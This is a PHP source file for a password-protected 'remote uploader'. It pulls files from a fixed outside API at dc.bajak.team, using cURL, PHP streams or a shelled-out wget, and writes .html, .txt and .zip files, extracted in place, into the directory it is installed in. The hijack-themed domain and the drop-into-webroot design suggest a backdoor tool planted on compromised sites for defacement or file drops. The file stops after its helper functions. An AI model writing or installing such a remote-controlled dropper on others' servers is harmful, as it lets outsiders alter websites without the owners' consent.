<?php
/*
 * DC Remote Uploader Legacy
 * Compatible target: PHP 5.6.40+
 * Single-file dashboard: password + API key, folder/file browser,
 * queued transfer progress, cURL -> file_get_contents -> wget fallback,
 * and safe "Upload & Unzip Here".
 */

if (version_compare(PHP_VERSION, '5.6.0', '<')) {
    header('Content-Type: text/plain; charset=utf-8');
    exit('Script ini membutuhkan minimal PHP 5.6.0. Versi aktif: ' . PHP_VERSION);
}

define('RU_VERSION', '8.0.0 PHP 5.6 LEGACY');
define('DC_API_BASE_URL', 'https://dc.bajak.team/api/v1');
define('DASHBOARD_PASSWORD_HASH', '$2y$12$kww5yMMknx7KXXmxeSdhreoXcDmrMhSVZ7R3cmULE0PzbQ1QNz0zi');
define('DESTINATION_ROOT', __DIR__);
define('MAX_ZIP_ENTRIES', 5000);
define('MAX_UNCOMPRESSED_ZIP_BYTES', 4294967296.0); // 4 GB; float aman untuk PHP 32-bit.
define('MAX_FILES_PER_TRANSFER', 200);
define('MAX_SINGLE_FILE_BYTES', 2147483647); // Hampir 2 GB agar aman di PHP 5.6 32-bit.
define('API_TIMEOUT_SECONDS', 45);
define('DOWNLOAD_TIMEOUT_SECONDS', 1800);
define('FILE_GET_CONTENTS_MAX_BYTES', 67108864); // 64 MB.
define('WGET_BINARY', 'wget');
define('PROGRESS_TTL_SECONDS', 7200);
define('SESSION_NAME', 'dc_remote_uploader_legacy');

function ru_allowed_extensions()
{
    return array('zip', 'txt', 'html');
}

function ru_array_get($array, $key, $default)
{
    return is_array($array) && array_key_exists($key, $array) ? $array[$key] : $default;
}

function ru_string_starts_with($haystack, $needle)
{
    if ($needle === '') {
        return true;
    }
    return substr($haystack, 0, strlen($needle)) === $needle;
}

function ru_string_ends_with($haystack, $needle)
{
    if ($needle === '') {
        return true;
    }
    if (strlen($needle) > strlen($haystack)) {
        return false;
    }
    return substr($haystack, -strlen($needle)) === $needle;
}

function ru_string_contains($haystack, $needle)
{
    return $needle === '' || strpos($haystack, $needle) !== false;
}

function ru_random_bytes_legacy($length)
{
    $length = (int) $length;
    if ($length < 1) {
        return '';
    }
    if (function_exists('random_bytes')) {
        return random_bytes($length);
    }
    if (function_exists('openssl_random_pseudo_bytes')) {
        $strong = false;
        $bytes = openssl_random_pseudo_bytes($length, $strong);
        if ($bytes !== false && strlen($bytes) === $length) {
            return $bytes;
        }
    }
    $file = @fopen('/dev/urandom', 'rb');
    if ($file !== false) {
        $bytes = @fread($file, $length);
        @fclose($file);
        if ($bytes !== false && strlen($bytes) === $length) {
            return $bytes;
        }
    }
    $bytes = '';
    for ($i = 0; $i < $length; $i++) {
        $bytes .= chr(mt_rand(0, 255));
    }
    return $bytes;
}

function ru_random_int_legacy($min, $max)
{
    $min = (int) $min;
    $max = (int) $max;
    if ($max <= $min) {
        return $min;
    }
    if (function_exists('random_int')) {
        return random_int($min, $max);
    }
    return mt_rand($min, $max);
}

function ru_hash_equals_legacy($known, $user)
{
    $known = (string) $known;
    $user = (string) $user;
    if (function_exists('hash_equals')) {
        return hash_equals($known, $user);
    }
    if (strlen($known) !== strlen($user)) {
        return false;
    }
    $result = 0;
    $length = strlen($known);
    for ($i = 0; $i < $length; $i++) {
        $result |= ord($known[$i]) ^ ord($user[$i]);
    }
    return $result === 0;
}

function ru_is_https()
{
    if (!empty($_SERVER['HTTPS']) && strtolower((string) $_SERVER['HTTPS']) !== 'off') {
        return true;
    }
    $forwarded = isset($_SERVER['HTTP_X_FORWARDED_PROTO']) ? (string) $_SERVER['HTTP_X_FORWARDED_PROTO'] : '';
    if (strtolower($forwarded) === 'https') {
        return true;
    }
    $cfVisitor = isset($_SERVER['HTTP_CF_VISITOR']) ? (string) $_SERVER['HTTP_CF_VISITOR'] : '';
    if ($cfVisitor !== '') {
        $decoded = json_decode($cfVisitor, true);
        return is_array($decoded) && ru_array_get($decoded, 'scheme', '') === 'https';
    }
    return false;
}

ini_set('session.use_strict_mode', '1');
ini_set('session.cookie_httponly', '1');
if (ru_is_https()) {
    ini_set('session.cookie_secure', '1');
}
session_name(SESSION_NAME);
session_start();

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: no-referrer');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

define('RU_SELF', isset($_SERVER['SCRIPT_NAME']) ? (string) $_SERVER['SCRIPT_NAME'] : 'remote-uploader-php56-legacy.php');

function ru_e($value)
{
    return htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function ru_csrf_token()
{
    if (empty($_SESSION['ru_csrf'])) {
        $_SESSION['ru_csrf'] = bin2hex(ru_random_bytes_legacy(32));
    }
    return (string) $_SESSION['ru_csrf'];
}

function ru_verify_csrf()
{
    $token = isset($_POST['csrf_token']) ? (string) $_POST['csrf_token'] : '';
    if ($token === '' || !ru_hash_equals_legacy(ru_csrf_token(), $token)) {
        throw new RuntimeException('Sesi formulir tidak valid. Muat ulang halaman lalu coba kembali.');
    }
}

function ru_json_response($payload, $status)
{
    if (!headers_sent()) {
        http_response_code((int) $status);
        header('Content-Type: application/json; charset=utf-8');
        header('X-Accel-Buffering: no');
    }
    echo json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

function ru_validate_job_id($jobId)
{
    $jobId = strtolower(trim((string) $jobId));
    if (!preg_match('/^[a-f0-9]{32}$/', $jobId)) {
        throw new RuntimeException('Job ID progress tidak valid.');
    }
    return $jobId;
}

function ru_progress_owner()
{
    $agent = isset($_SERVER['HTTP_USER_AGENT']) ? (string) $_SERVER['HTTP_USER_AGENT'] : 'unknown';
    return hash('sha256', session_id() . '|' . $agent);
}

function ru_progress_directory()
{
    static $resolved = null;
    if (is_string($resolved) && $resolved !== '') {
        return $resolved;
    }
    $candidates = array(
        rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'dc-remote-uploader-progress-legacy',
        rtrim(DESTINATION_ROOT, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.dc-remote-uploader-progress'
    );
    foreach ($candidates as $directory) {
        if (!is_dir($directory) && !@mkdir($directory, 0700, true) && !is_dir($directory)) {
            continue;
        }
        if (!is_writable($directory)) {
            continue;
        }
        @chmod($directory, 0700);
        if (ru_string_starts_with($directory, rtrim(DESTINATION_ROOT, DIRECTORY_SEPARATOR))) {
            @file_put_contents($directory . DIRECTORY_SEPARATOR . '.htaccess', "Require all denied\nDeny from all\n");
            @file_put_contents($directory . DIRECTORY_SEPARATOR . 'index.html', '');
        }
        $resolved = $directory;
        return $resolved;
    }
    throw new RuntimeException('Direktori progress tidak dapat dibuat. Periksa permission PHP.');
}

function ru_progress_path($jobId)
{
    return ru_progress_directory() . DIRECTORY_SEPARATOR . 'job-' . ru_validate_job_id($jobId) . '.json';
}

function ru_write_progress($jobId, $owner, $data)
{
    $path = ru_progress_path($jobId);
    $payload = array_merge(array(
        'job_id' => $jobId,
        'owner' => $owner,
        'status' => 'running',
        'stage' => 'Menyiapkan proses',
        'percent' => 0,
        'downloaded_bytes' => 0,
        'total_bytes' => 0,
        'updated_at' => time()
    ), is_array($data) ? $data : array());
    $payload['job_id'] = $jobId;
    $payload['owner'] = $owner;
    $payload['updated_at'] = time();
    $payload['percent'] = max(0, min(100, (int) ru_array_get($payload, 'percent', 0)));
    $temp = $path . '.tmp-' . bin2hex(ru_random_bytes_legacy(4));
    $json = json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    if ($json === false || @file_put_contents($temp, $json, LOCK_EX) === false) {
        @unlink($temp);
        return;
    }
    @chmod($temp, 0600);
    @rename($temp, $path);
}

function ru_read_progress($jobId, $owner)
{
    $path = ru_progress_path($jobId);
    if (!is_file($path)) {
        return array(
            'job_id' => $jobId,
            'status' => 'waiting',
            'stage' => 'Menunggu proses dimulai',
            'percent' => 0,
            'downloaded_bytes' => 0,
            'total_bytes' => 0
        );
    }
    $decoded = json_decode((string) @file_get_contents($path), true);
    if (!is_array($decoded) || !ru_hash_equals_legacy($owner, (string) ru_array_get($decoded, 'owner', ''))) {
        throw new RuntimeException('Data progress tidak ditemukan atau tidak sesuai sesi.');
    }
    unset($decoded['owner']);
    return $decoded;
}

function ru_cleanup_progress_files()
{
    try {
        $directory = ru_progress_directory();
    } catch (Exception $ignored) {
        return;
    }
    $threshold = time() - PROGRESS_TTL_SECONDS;
    $files = glob($directory . DIRECTORY_SEPARATOR . 'job-*.json');
    if (!is_array($files)) {
        return;
    }
    foreach ($files as $file) {
        if (is_file($file) && (int) @filemtime($file) < $threshold) {
            @unlink($file);
        }
    }
}

if (ru_random_int_legacy(1, 20) === 1) {
    ru_cleanup_progress_files();
}

function ru_flash($type, $message)
{
    if (!isset($_SESSION['ru_flashes']) || !is_array($_SESSION['ru_flashes'])) {
        $_SESSION['ru_flashes'] = array();
    }
    $_SESSION['ru_flashes'][] = array('type' => $type, 'message' => $message);
}

function ru_pull_flashes()
{
    $items = isset($_SESSION['ru_flashes']) && is_array($_SESSION['ru_flashes']) ? $_SESSION['ru_flashes'] : array();
    unset($_SESSION['ru_flashes']);
    return $items;
}

function ru_redirect($query)
{
    $location = RU_SELF;
    if (is_array($query) && count($query) > 0) {
        $location .= '?' . http_build_query($query);
    }
    header('Location: ' . $location, true, 302);
    exit;
}

function ru_authenticated()
{
    return !empty($_SESSION['ru_authenticated']) && isset($_SESSION['ru_api_key']) && is_string($_SESSION['ru_api_key']);
}

function ru_logout()
{
    $_SESSION = array();
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'], (bool) $params['secure'], (bool) $params['httponly']);
    }
    session_destroy();
}

function ru_human_bytes($bytes)
{
    $bytes = (float) $bytes;
    if ($bytes < 1024) {
        return number_format($bytes, 0) . ' B';
    }
    $units = array('KB', 'MB', 'GB', 'TB');
    $value = $bytes / 1024;
    foreach ($units as $unit) {
        if ($value < 1024 || $unit === 'TB') {
            return number_format($value, $value >= 10 ? 1 : 2) . ' ' . $unit;
        }
        $value /= 1024;
    }
    return number_format($bytes, 0) . ' B';
}

function ru_api_url($endpoint)
{
    $endpoint = (string) $endpoint;
    if ($endpoint === '' || $endpoint[0] !== '/' || ru_string_contains($endpoint, '://')) {
        throw new RuntimeException('Endpoint API tidak valid.');
    }
    return rtrim(DC_API_BASE_URL, '/') . $endpoint;
}

function ru_parse_http_status($headers)
{
    $status = 0;
    if (!is_array($headers)) {
        return 0;
    }
    foreach ($headers as $header) {
        if (preg_match('#^HTTP/\S+\s+(\d{3})#i', (string) $header, $matches)) {
            $status = (int) $matches[1];
        }
    }
    return $status;
}

function ru_runtime_function_available($function)
{
    if (!function_exists($function)) {
        return false;
    }
    $disabled = preg_split('/\s*,\s*/', (string) ini_get('disable_functions'), -1, PREG_SPLIT_NO_EMPTY);
    return !is_array($disabled) || !in_array($function, $disabled, true);
}

function ru_allow_url_fopen_enabled()
{
    $value = strtolower(trim((string) ini_get('allow_url_fopen')));
    return in_array($value, array('1', 'on', 'yes', 'true'), true);
}

function ru_ini_bytes($value)
{
    $value = trim((string) $value);
    if ($value === '' || $value === '-1') {
        return -1;
    }
    $unit = strtolower(substr($value, -1));
    $number = (float) $value;
    if ($unit === 'g') {
        $number *= 1024 * 1024 * 1024;
    } elseif ($unit === 'm') {
        $number *= 1024 * 1024;
    } elseif ($unit === 'k') {
        $number *= 1024;
    }
    return (int) min($number, PHP_INT_MAX);
}

function ru_file_get_contents_safe_limit()
{
    $memory = ru_ini_bytes(ini_get('memory_limit'));
    $hard = FILE_GET_CONTENTS_MAX_BYTES;
    if ($memory < 0) {
        return $hard;
    }
    $available = $memory - memory_get_usage(true) - 16777216;
    if ($available <= 0) {
        return 0;
    }
    return (int) max(0, min($hard, floor($available * 0.55)));
}

function ru_compact_error($message, $max)
{
    $message = preg_replace('/\s+/', ' ', trim((string) $message));
    if ($message === null) {
        $message = 'Kesalahan tidak diketahui';
    }
    if (strlen($message) > $max) {
        $message = substr($message, 0, $max - 3) . '...';
    }
    return $message;
}

function ru_wget_supported()
{
    return ru_runtime_function_available('proc_open') || ru_runtime_function_available('exec');
}

function ru_build_wget_command($url, $headers, $output, $timeout)
{
    $binary = preg_match('#^[A-Za-z0-9._/\\-]+$#', WGET_BINARY) ? WGET_BINARY : 'wget';
    $parts = array(
        escapeshellcmd($binary),
        '--no-verbose',
        '--tries=1',
        '--timeout=' . (int) max(10, $timeout),
        '--max-redirect=0',
        '--progress=dot:giga'
    );
    foreach ($headers as $header) {
        $parts[] = '--header=' . escapeshellarg($header);
    }
    $parts[] = '-O';
    $parts[] = escapeshellarg($output);
    $parts[] = escapeshellarg($url);
    return implode(' ', $parts);
}

function ru_wget_to_file($url, $headers, $output, $expectedBytes, $maxBytes, $timeout, $progress)
{
    $command = ru_build_wget_command($url, $headers, $output, $timeout);
    @unlink($output);

    if (ru_runtime_function_available('proc_open')) {
        $descriptors = array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
        );
        $process = @proc_open($command, $descriptors, $pipes);
        if (!is_resource($process)) {
            throw new RuntimeException('proc_open gagal menjalankan wget.');
        }
        @fclose($pipes[0]);
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);
        $stderr = '';
        $started = time();
        while (true) {
            $status = proc_get_status($process);
            $stderr .= (string) stream_get_contents($pipes[2]);
            clearstatcache(true, $output);
            $downloaded = is_file($output) ? (float) @filesize($output) : 0;
            if ($downloaded > $maxBytes) {
                @proc_terminate($process, 9);
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($process);
                @unlink($output);
                throw new RuntimeException('Ukuran hasil wget melewati batas keamanan.');
            }
            if (is_callable($progress)) {
                call_user_func($progress, $downloaded, $expectedBytes > 0 ? $expectedBytes : 0);
            }
            if (!$status['running']) {
                $exitCode = isset($status['exitcode']) ? (int) $status['exitcode'] : -1;
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                $closed = @proc_close($process);
                if ($exitCode < 0 && is_int($closed)) {
                    $exitCode = $closed;
                }
                if ($exitCode !== 0) {
                    throw new RuntimeException('wget gagal (exit ' . $exitCode . '): ' . ru_compact_error($stderr, 350));
                }
                break;
            }
            if (time() - $started > $timeout) {
                @proc_terminate($process, 9);
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($process);
                @unlink($output);
                throw new RuntimeException('wget timeout.');
            }
            usleep(250000);
        }
        return;
    }

    if (ru_runtime_function_available('exec')) {
        $lines = array();
        $code = 0;
        @exec($command . ' 2>&1', $lines, $code);
        if ($code !== 0) {
            throw new RuntimeException('wget gagal (exit ' . $code . '): ' . ru_compact_error(implode(' ', $lines), 350));
        }
        return;
    }

    throw new RuntimeException('wget tidak tersedia karena proc_open dan exec dinonaktifkan.');
}

function ru_api_json($endpoint, $apiKey)
{
    $url = ru_api_url($endpoint);
    $headers = array(
        'Accept: application/json',
        'Authorization: Bearer ' . $apiKey,
        'X-API-Key: ' . $apiKey,
        'User-Agent: DC-Remote-Uploader-Legacy/8.0'
    );
    $errors = array();
    $body = false;
    $status = 0;

    if (function_exists('curl_init')) {
        try {
            $curl = curl_init($url);
            if ($curl === false) {
                throw new RuntimeException('curl_init gagal.');
            }
            $options = array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_CONNECTTIMEOUT => 15,
                CURLOPT_TIMEOUT => API_TIMEOUT_SECONDS,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_SSL_VERIFYPEER => true,
                CURLOPT_SSL_VERIFYHOST => 2
            );
            if (defined('CURLOPT_PROTOCOLS') && defined('CURLPROTO_HTTPS')) {
                $options[CURLOPT_PROTOCOLS] = CURLPROTO_HTTPS;
            }
            curl_setopt_array($curl, $options);
            $curlBody = curl_exec($curl);
            $curlStatus = (int) curl_getinfo($curl, CURLINFO_HTTP_CODE);
            $curlError = curl_error($curl);
            curl_close($curl);
            if ($curlBody === false) {
                throw new RuntimeException($curlError !== '' ? $curlError : 'curl_exec gagal.');
            }
            if ($curlStatus < 200 || $curlStatus >= 300) {
                throw new RuntimeException('HTTP ' . $curlStatus . '.');
            }
            $body = $curlBody;
            $status = $curlStatus;
        } catch (Exception $error) {
            $errors[] = 'cURL: ' . ru_compact_error($error->getMessage(), 280);
        }
    } else {
        $errors[] = 'cURL: ekstensi tidak tersedia';
    }

    if ($body === false && ru_allow_url_fopen_enabled()) {
        try {
            $context = stream_context_create(array(
                'http' => array(
                    'method' => 'GET',
                    'header' => implode("\r\n", $headers),
                    'timeout' => API_TIMEOUT_SECONDS,
                    'ignore_errors' => true,
                    'follow_location' => 0
                ),
                'ssl' => array(
                    'verify_peer' => true,
                    'verify_peer_name' => true
                )
            ));
            $streamBody = @file_get_contents($url, false, $context, 0, 5242880);
            $responseHeaders = isset($http_response_header) && is_array($http_response_header) ? $http_response_header : array();
            $streamStatus = ru_parse_http_status($responseHeaders);
            if ($streamBody === false) {
                throw new RuntimeException('file_get_contents gagal membuka endpoint.');
            }
            if ($streamStatus < 200 || $streamStatus >= 300) {
                throw new RuntimeException('HTTP ' . $streamStatus . '.');
            }
            $body = $streamBody;
            $status = $streamStatus;
        } catch (Exception $error) {
            $errors[] = 'file_get_contents: ' . ru_compact_error($error->getMessage(), 280);
        }
    } elseif ($body === false) {
        $errors[] = 'file_get_contents: allow_url_fopen nonaktif';
    }

    if ($body === false && ru_wget_supported()) {
        $temp = ru_progress_directory() . DIRECTORY_SEPARATOR . 'api-' . bin2hex(ru_random_bytes_legacy(8)) . '.tmp';
        try {
            ru_wget_to_file($url, $headers, $temp, 0, 5242880, API_TIMEOUT_SECONDS, null);
            $wgetBody = @file_get_contents($temp);
            if ($wgetBody === false) {
                throw new RuntimeException('Respons wget tidak dapat dibaca.');
            }
            $body = $wgetBody;
            $status = 200;
        } catch (Exception $error) {
            $errors[] = 'wget: ' . ru_compact_error($error->getMessage(), 280);
        }
        @unlink($temp);
    } elseif ($body === false) {
        $errors[] = 'wget: proc_open/exec tidak tersedia';
    }

    if ($body === false) {
        throw new RuntimeException('Semua metode koneksi API gagal. ' . implode(' | ', $errors));
    }
    $decoded = json_decode((string) $body, true);
    if (!is_array($decoded)) {
        throw new RuntimeException('Respons API bukan JSON yang valid (HTTP ' . $status . ').');
    }
    if ($status < 200 || $status >= 300 || empty($decoded['ok'])) {
        $errorData = ru_array_get($decoded, 'error', array());
        $message = is_array($errorData) ? ru_array_get($errorData, 'message', 'API mengembalikan HTTP ' . $status) : 'API mengembalikan HTTP ' . $status;
        throw new RuntimeException((string) $message);
    }
    $data = ru_array_get($decoded, 'data', array());
    return is_array($data) ? $data : array();
}

function ru_validate_download_url($url)
{
    $parts = parse_url((string) $url);
    $base = parse_url(DC_API_BASE_URL);
    if (!is_array($parts) || !is_array($base)) {
        throw new RuntimeException('URL download tidak valid.');
    }
    if (strtolower((string) ru_array_get($parts, 'scheme', '')) !== 'https') {
        throw new RuntimeException('Download hanya diizinkan melalui HTTPS.');
    }
    $baseHost = strtolower((string) ru_array_get($base, 'host', ''));
    $targetHost = strtolower((string) ru_array_get($parts, 'host', ''));
    if (!ru_hash_equals_legacy($baseHost, $targetHost)) {
        throw new RuntimeException('Host download tidak sesuai dengan host API.');
    }
    $path = (string) ru_array_get($parts, 'path', '');
    if (!preg_match('#^/api/v1/files/[0-9]+/download$#', $path)) {
        throw new RuntimeException('Endpoint download tidak diizinkan.');
    }
}

function ru_verify_downloaded_file($tempPath, $expectedBytes)
{
    clearstatcache(true, $tempPath);
    $actualBytes = @filesize($tempPath);
    if ($actualBytes === false) {
        throw new RuntimeException('Ukuran file hasil download tidak dapat dibaca.');
    }
    $actualBytes = (float) $actualBytes;
    if ($actualBytes <= 0) {
        throw new RuntimeException('File hasil download kosong.');
    }
    if ($actualBytes > MAX_SINGLE_FILE_BYTES) {
        throw new RuntimeException('Ukuran file melebihi batas keamanan.');
    }
    if ((float) $expectedBytes > 0 && $actualBytes != (float) $expectedBytes) {
        throw new RuntimeException('Ukuran file tidak cocok. Expected ' . $expectedBytes . ' byte, received ' . $actualBytes . ' byte.');
    }
    return $actualBytes;
}

function ru_download_file($url, $apiKey, $tempPath, $expectedBytes, $progress, &$usedMethod, $stage)
{
    ru_validate_download_url($url);
    $headers = array(
        'Accept: application/octet-stream',
        'Authorization: Bearer ' . $apiKey,
        'X-API-Key: ' . $apiKey,
        'User-Agent: DC-Remote-Uploader-Legacy/8.0'
    );
    $errors = array();
    $usedMethod = null;

    $lastAt = 0.0;
    $lastBytes = -1;
    $report = function ($downloaded, $total) use ($progress, &$lastAt, &$lastBytes) {
        if (!is_callable($progress)) {
            return;
        }
        $downloaded = max(0, (float) $downloaded);
        $total = max(0, (float) $total);
        $now = microtime(true);
        if ($total > 0 && $downloaded != $total && ($downloaded - $lastBytes) < 524288 && ($now - $lastAt) < 0.35) {
            return;
        }
        $lastAt = $now;
        $lastBytes = $downloaded;
        call_user_func($progress, $downloaded, $total);
    };
    $announce = function ($message) use ($stage) {
        if (is_callable($stage)) {
            call_user_func($stage, $message);
        }
    };

    if (function_exists('curl_init')) {
        call_user_func($announce, 'Mencoba download melalui cURL');
        @unlink($tempPath);
        try {
            $handle = @fopen($tempPath, 'wb');
            if ($handle === false) {
                throw new RuntimeException('File sementara tidak dapat dibuat. Periksa permission folder tujuan.');
            }
            $curl = curl_init($url);
            if ($curl === false) {
                @fclose($handle);
                throw new RuntimeException('curl_init gagal.');
            }
            $tooLarge = false;
            $callback = function ($resource, $downloadTotal, $downloaded, $uploadTotal, $uploaded) use ($expectedBytes, $report, &$tooLarge) {
                $total = $downloadTotal > 0 ? $downloadTotal : $expectedBytes;
                if ($downloaded > MAX_SINGLE_FILE_BYTES || $total > MAX_SINGLE_FILE_BYTES) {
                    $tooLarge = true;
                    return 1;
                }
                call_user_func($report, $downloaded, $total);
                return 0;
            };
            $options = array(
                CURLOPT_FILE => $handle,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_CONNECTTIMEOUT => 20,
                CURLOPT_TIMEOUT => DOWNLOAD_TIMEOUT_SECONDS,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_SSL_VERIFYPEER => true,
                CURLOPT_SSL_VERIFYHOST => 2,
                CURLOPT_FAILONERROR => false,
                CURLOPT_NOPROGRESS => false,
                CURLOPT_PROGRESSFUNCTION => $callback
            );
            if (defined('CURLOPT_PROTOCOLS') && defined('CURLPROTO_HTTPS')) {
                $options[CURLOPT_PROTOCOLS] = CURLPROTO_HTTPS;
            }
            curl_setopt_array($curl, $options);
            $success = curl_exec($curl);
            $status = (int) curl_getinfo($curl, CURLINFO_HTTP_CODE);
            $error = curl_error($curl);
            curl_close($curl);
            fclose($handle);
            if ($success === false) {
                throw new RuntimeException($tooLarge ? 'Ukuran download melebihi batas.' : ($error !== '' ? $error : 'curl_exec gagal.'));
            }
            if ($status !== 200) {
                throw new RuntimeException('HTTP ' . $status . '.');
            }
            $actual = ru_verify_downloaded_file($tempPath, $expectedBytes);
            call_user_func($report, $actual, $expectedBytes > 0 ? $expectedBytes : $actual);
            $usedMethod = 'cURL';
            return $actual;
        } catch (Exception $error) {
            if (isset($handle) && is_resource($handle)) {
                @fclose($handle);
            }
            $errors[] = 'cURL: ' . ru_compact_error($error->getMessage(), 280);
            @unlink($tempPath);
            call_user_func($announce, 'cURL gagal, mencoba file_get_contents');
        }
    } else {
        $errors[] = 'cURL: ekstensi tidak tersedia';
        call_user_func($announce, 'cURL tidak tersedia, mencoba file_get_contents');
    }

    if (ru_allow_url_fopen_enabled()) {
        $safeLimit = ru_file_get_contents_safe_limit();
        if ($expectedBytes > 0 && $expectedBytes > $safeLimit) {
            $errors[] = 'file_get_contents: dilewati karena file terlalu besar untuk memory PHP';
            call_user_func($announce, 'file_get_contents dilewati untuk file besar, mencoba wget -O');
        } elseif ($safeLimit <= 0) {
            $errors[] = 'file_get_contents: memory PHP tidak mencukupi';
            call_user_func($announce, 'Memory PHP tidak cukup, mencoba wget -O');
        } else {
            @unlink($tempPath);
            call_user_func($announce, 'Mencoba download melalui file_get_contents');
            try {
                $context = stream_context_create(array(
                    'http' => array(
                        'method' => 'GET',
                        'header' => implode("\r\n", $headers),
                        'timeout' => DOWNLOAD_TIMEOUT_SECONDS,
                        'ignore_errors' => true,
                        'follow_location' => 0
                    ),
                    'ssl' => array('verify_peer' => true, 'verify_peer_name' => true)
                ));
                $limit = min($safeLimit, MAX_SINGLE_FILE_BYTES) + 1;
                $content = @file_get_contents($url, false, $context, 0, $limit);
                $responseHeaders = isset($http_response_header) && is_array($http_response_header) ? $http_response_header : array();
                $status = ru_parse_http_status($responseHeaders);
                if ($content === false) {
                    throw new RuntimeException('file_get_contents gagal membuka file sumber.');
                }
                if ($status !== 200) {
                    throw new RuntimeException('HTTP ' . $status . '.');
                }
                if (strlen($content) > $safeLimit || strlen($content) > MAX_SINGLE_FILE_BYTES) {
                    throw new RuntimeException('Respons melewati batas memory aman.');
                }
                if (@file_put_contents($tempPath, $content, LOCK_EX) === false) {
                    throw new RuntimeException('Gagal menulis file sementara.');
                }
                unset($content);
                $actual = ru_verify_downloaded_file($tempPath, $expectedBytes);
                call_user_func($report, $actual, $expectedBytes > 0 ? $expectedBytes : $actual);
                $usedMethod = 'file_get_contents';
                return $actual;
            } catch (Exception $error) {
                $errors[] = 'file_get_contents: ' . ru_compact_error($error->getMessage(), 280);
                @unlink($tempPath);
                call_user_func($announce, 'file_get_contents gagal, mencoba wget -O');
            }
        }
    } else {
        $errors[] = 'file_get_contents: allow_url_fopen nonaktif';
        call_user_func($announce, 'allow_url_fopen nonaktif, mencoba wget -O');
    }

    if (ru_wget_supported()) {
        @unlink($tempPath);
        call_user_func($announce, 'Mencoba fallback terminal wget -O');
        try {
            ru_wget_to_file($url, $headers, $tempPath, $expectedBytes, MAX_SINGLE_FILE_BYTES, DOWNLOAD_TIMEOUT_SECONDS, $report);
            $actual = ru_verify_downloaded_file($tempPath, $expectedBytes);
            call_user_func($report, $actual, $expectedBytes > 0 ? $expectedBytes : $actual);
            $usedMethod = 'wget -O';
            return $actual;
        } catch (Exception $error) {
            $errors[] = 'wget: ' . ru_compact_error($error->getMessage(), 280);
            @unlink($tempPath);
        }
    } else {
        $errors[] = 'wget: proc_open dan exec tidak tersedia';
    }

    throw new RuntimeException('Semua metode download gagal. ' . implode(' | ', $errors));
}

function ru_safe_remote_filename($filename, $extension)
{
    $extension = strtolower((string) $extension);
    if (!in_array($extension, ru_allowed_extensions(), true)) {
        throw new RuntimeException('Ekstensi file tidak diizinkan.');
    }
    $base = pathinfo(basename((string) $filename), PATHINFO_FILENAME);
    $base = preg_replace('/[^a-zA-Z0-9._-]+/', '-', $base);
    if ($base === null || $base === '') {
        $base = 'file';
    }
    $base = trim($base, '.-_');
    if ($base === '') {
        $base = 'file';
    }
    return substr($base, 0, 150) . '.' . $extension;
}

function ru_public_url($filename)
{
    $host = isset($_SERVER['HTTP_HOST']) ? preg_replace('/[^a-zA-Z0-9.\-:\[\]]/', '', (string) $_SERVER['HTTP_HOST']) : 'localhost';
    $scriptDir = str_replace('\\', '/', dirname(isset($_SERVER['SCRIPT_NAME']) ? (string) $_SERVER['SCRIPT_NAME'] : '/'));
    if ($scriptDir === '/' || $scriptDir === '.') {
        $scriptDir = '';
    }
    return (ru_is_https() ? 'https' : 'http') . '://' . $host . $scriptDir . '/' . rawurlencode($filename);
}

function ru_zip_entry_path($entryName)
{
    $entryName = str_replace('\\', '/', (string) $entryName);
    if ($entryName === '' || ru_string_contains($entryName, "\0")) {
        throw new RuntimeException('Nama entry ZIP tidak valid.');
    }
    if (ru_string_starts_with($entryName, '/') || preg_match('/^[a-zA-Z]:\//', $entryName)) {
        throw new RuntimeException('ZIP memuat absolute path.');
    }
    $isDirectory = ru_string_ends_with($entryName, '/');
    $parts = explode('/', trim($entryName, '/'));
    $safe = array();
    foreach ($parts as $part) {
        if ($part === '' || $part === '.') {
            continue;
        }
        if ($part === '..') {
            throw new RuntimeException('ZIP memuat path traversal ../.');
        }
        if (!preg_match('/^[^\x00-\x1F\x7F]{1,255}$/', $part)) {
            throw new RuntimeException('Nama file dalam ZIP tidak valid.');
        }
        $safe[] = $part;
    }
    if (count($safe) === 0) {
        throw new RuntimeException('Entry ZIP kosong.');
    }
    return implode(DIRECTORY_SEPARATOR, $safe) . ($isDirectory ? DIRECTORY_SEPARATOR : '');
}

function ru_zip_entry_is_symlink($zip, $index)
{
    if (!method_exists($zip, 'getExternalAttributesIndex')) {
        return false;
    }
    $opsys = 0;
    $attributes = 0;
    $ok = @$zip->getExternalAttributesIndex($index, $opsys, $attributes);
    if (!$ok || (int) $opsys !== 3) {
        return false;
    }
    $mode = ($attributes >> 16) & 0170000;
    return $mode === 0120000;
}

function ru_path_inside_root($root, $relativePath)
{
    $root = rtrim($root, DIRECTORY_SEPARATOR);
    $target = $root . DIRECTORY_SEPARATOR . ltrim($relativePath, DIRECTORY_SEPARATOR);
    $parent = dirname($target);
    if (!is_dir($parent) && !@mkdir($parent, 0755, true) && !is_dir($parent)) {
        throw new RuntimeException('Folder hasil ekstraksi tidak dapat dibuat: ' . $parent);
    }
    $realRoot = realpath($root);
    $realParent = realpath($parent);
    if ($realRoot === false || $realParent === false) {
        throw new RuntimeException('Path ekstraksi tidak dapat diverifikasi.');
    }
    if ($realParent !== $realRoot && !ru_string_starts_with($realParent, $realRoot . DIRECTORY_SEPARATOR)) {
        throw new RuntimeException('Target ekstraksi keluar dari folder uploader.');
    }
    return $target;
}

